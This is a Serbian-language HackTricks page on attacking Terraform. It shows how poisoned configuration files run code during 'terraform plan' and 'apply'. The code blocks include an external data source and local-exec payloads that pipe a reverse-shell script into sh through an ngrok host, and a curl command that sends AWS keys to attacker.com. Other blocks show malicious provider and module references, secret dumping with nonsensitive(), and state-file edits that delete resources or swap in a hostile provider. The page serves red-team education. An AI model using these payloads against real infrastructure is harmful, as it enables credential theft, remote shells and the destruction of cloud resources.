# Bezbednost Terraforma

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

[Od dokumenata:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform je alat za **infrastrukturu kao kod** koji vam omogu캖ava da defini코ete **oblak i resurse na lokaciji** u 캜itljivim konfiguracionim fajlovima koje mo쬰te verzionisati, ponovo koristiti i deliti. Zatim mo쬰te koristiti dosledan radni tok za obezbe캠ivanje i upravljanje celokupnom infrastrukturom tokom njenog 쬴votnog ciklusa. Terraform mo쬰 upravljati komponentama niskog nivoa poput ra캜unanja, skladi코tenja i mre쬹ih resursa, kao i komponentama visokog nivoa poput DNS unosa i SaaS funkcija.

### Kako radi Terraform?

Terraform kreira i upravlja resursima na cloud platformama i drugim uslugama putem njihovih programskih interfejsa (API-ja). Provajderi omogu캖avaju Terraformu da radi sa gotovo bilo kojom platformom ili uslugom sa pristupa캜nim API-jem.

![](<../.gitbook/assets/image (177).png>)

HashiCorp i Terraform zajednica ve캖 su napisali **vi코e od 1700 provajdera** za upravljanje hiljadama razli캜itih tipova resursa i usluga, a ovaj broj nastavlja da raste. Sve javno dostupne provajdere mo쬰te prona캖i na [Terraform Registru](https://registry.terraform.io/), uklju캜uju캖i Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i mnoge druge.

Osnovni Terraform radni tok sastoji se od tri faze:

* **Pisanje:** Defini코ete resurse koji mogu biti na vi코e cloud provajdera i usluga. Na primer, mo쬰te kreirati konfiguraciju za implementaciju aplikacije na virtuelnim ma코inama u Virtualnoj privatnoj mre쬴 (VPC) sa sigurnosnim grupama i balanserom optere캖enja.
* **Planiranje:** Terraform kreira izvr코ni plan koji opisuje infrastrukturu koju 캖e kreirati, a쬿rirati ili uni코titi na osnovu postoje캖e infrastrukture i va코e konfiguracije.
* **Primena:** Po odobrenju, Terraform vr코i predlo쬰ne operacije u ispravnom redosledu, po코tuju캖i sve zavisnosti resursa. Na primer, ako a쬿rirate osobine VPC-a i promenite broj virtuelnih ma코ina u tom VPC-u, Terraform 캖e ponovo kreirati VPC pre skaliranja virtuelnih ma코ina.

![](<../.gitbook/assets/image (215).png>)

## Terraform Laboratorija

Jednostavno instalirajte Terraform na svom ra캜unaru.

Evo [vodi캜a](https://learn.hashicorp.com/tutorials/terraform/install-cli) i ovde imate [najbolji na캜in za preuzimanje Terraforma](https://www.terraform.io/downloads).

## RCE u Terraformu

Terraform **nema platformu koja izla쬰 web stranicu ili mre쬹u uslugu** koju mo쬰mo enumerisati, stoga je jedini na캜in da kompromitujemo Terraform da **budemo u mogu캖nosti da dodamo/izmenimo konfiguracione fajlove Terraforma**.

Me캠utim, Terraform je **vrlo osetljiva komponenta** za kompromitovanje jer 캖e imati **privilegovani pristup** do razli캜itih lokacija kako bi mogla pravilno da funkcioni코e.

Glavni na캜in za napada캜a da bude u mogu캖nosti da kompromituje sistem na kojem se izvr코ava Terraform je da **kompromituje repozitorijum koji 캜uva konfiguracije Terraforma**, jer 캖e u nekom trenutku biti **interpretirane**.

Zapravo, postoje re코enja koja **automatski izvr코avaju terraform plan/apply nakon 코to je napravljen PR**, kao 코to je **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Ako ste u mogu캖nosti da kompromitujete Terraform fajl, postoje razli캜iti na캜ini na koje mo쬰te izvr코iti RCE kada neko izvr코i `terraform plan` ili `terraform apply`.

### Terraform plan

Terraform plan je **naj캜e코캖e kori코캖ena komanda** u Terraformu i developeri/re코enja koja koriste Terraform je 캜esto pozivaju, tako da je **najlak코i na캜in za dobijanje RCE** da se pobrinite da otrovate Terraform konfiguracioni fajl koji 캖e izvr코iti proizvoljne komande u `terraform plan`.

#### Kori코캖enje spoljnog provajdera

Terraform nudi [`external` provajder](https://registry.terraform.io/providers/hashicorp/external/latest/docs) koji pru쬬 na캜in za interfejs izme캠u Terraforma i spoljnih programa. Mo쬰te koristiti `external` izvor podataka da pokrenete proizvoljni kod tokom `plan`-a.

Ubacivanje ne캜ega poput slede캖eg u Terraform konfiguracioni fajl 캖e izvr코iti reverznu ljusku prilikom izvr코avanja `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Kori코캖enje prilago캠enog provajdera

Napada캜 bi mogao poslati [prilago캠eni provajder](https://learn.hashicorp.com/tutorials/terraform/provider-setup) na [Terraform Registry](https://registry.terraform.io/) i zatim ga dodati u Terraform kod u grani funkcije ([primer odavde](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Provajder se preuzima u `init` i pokrenu캖e zlonamerni kod kada se izvr코i `plan`

Primer mo쬰te prona캖i na [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Kori코캖enje spoljnog referentnog

Obe pomenute opcije su korisne ali nisu vrlo prikrivene (druga je prikrivenija ali slo쬰nija od prve). Mo쬰te izvesti ovaj napad 캜ak na **prikriveniji na캜in**, prate캖i ove sugestije:

* Umesto dodavanja reverznog 코ela direktno u terraform fajl, mo쬰te **u캜itati spoljni resurs** koji sadr쬴 reverzni 코el:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Mo쬰te prona캖i kod za rev shell na [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* U spoljnom resursu, koristite funkciju **ref** da biste sakrili **terraform rev shell kod u grani** unutar repozitorijuma, ne코to poput: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply 캖e biti izvr코en kako bi primenio sve promene, tako캠e ga mo쬰te zloupotrebiti da biste dobili RCE ubacivanjem **zlonamernog Terraform fajla sa** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Samo se pobrinite da se neki payload poput slede캖ih zavr코ava u fajlu `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Pratite **predloge iz prethodne tehnike** da biste izvr코ili ovaj napad na **diskretniji na캜in kori코캖enjem spoljnih referenci**.

## Dumpovanje Tajni

Mo쬰te imati **vrednosti tajni kori코캖ene od strane terraforma dumpovane** pokretanjem `terraform apply` dodavanjem ne캜ega poput slede캖eg u terraform fajl:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Zloupotreba Terraform stanja datoteka

U slu캜aju da imate pristup za pisanje nad stanjem terraform datoteka, ali ne mo쬰te promeniti terraform kod, [**ova istra쬴vanja**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) pru쬬ju neke zanimljive opcije za iskori코캖avanje datoteke:

### Brisanje resursa <a href="#deleting-resources" id="deleting-resources"></a>

Postoje 2 na캜ina za uni코tavanje resursa:

1. **Umetnite resurs sa nasumi캜nim imenom u stanje datoteke koje pokazuje na pravi resurs za brisanje**

Po코to 캖e terraform videti da resurs ne bi trebao postojati, uni코ti캖e ga (prate캖i stvarni ID resursa koji je nazna캜en). Primer sa prethodne stranice:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Izmenite resurs za brisanje na na캜in da nije mogu캖e a쬿rirati (tako da 캖e biti obrisan i ponovo kreiran)**

Za EC2 instancu, dovoljno je izmeniti tip instance da bi terraform obrisao i ponovo kreirao.

### RCE

Tako캠e je mogu캖e [kreirati prilago캠enog provajdera](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) i jednostavno zameniti jednog od provajdera u datoteci stanja terraforma zlonamernim ili dodati prazan resurs sa zlonamernim provajderom. Primer iz originalnog istra쬴vanja:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Zamena zabranjenog provajdera

U slu캜aju da se susretnete sa situacijom gde je `hashicorp/external` stavljena na crnu listu, mo쬰te ponovo implementirati `external` provajder slede캖i ove korake. Napomena: Koristimo fork `external` provajdera objavljen od strane https://registry.terraform.io/providers/nazarewk/external/latest. Tako캠e mo쬰te objaviti svoj sopstveni fork ili ponovnu implementaciju.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Tada mo쬰te koristiti `external` kao i obi캜no.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Alatke za reviziju

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec koristi stati캜ku analizu va코eg terraform koda kako bi otkrio potencijalne lo코e konfiguracije.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan je stati캜ki analizator koda za infrastrukturu kao kod.

## Reference

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
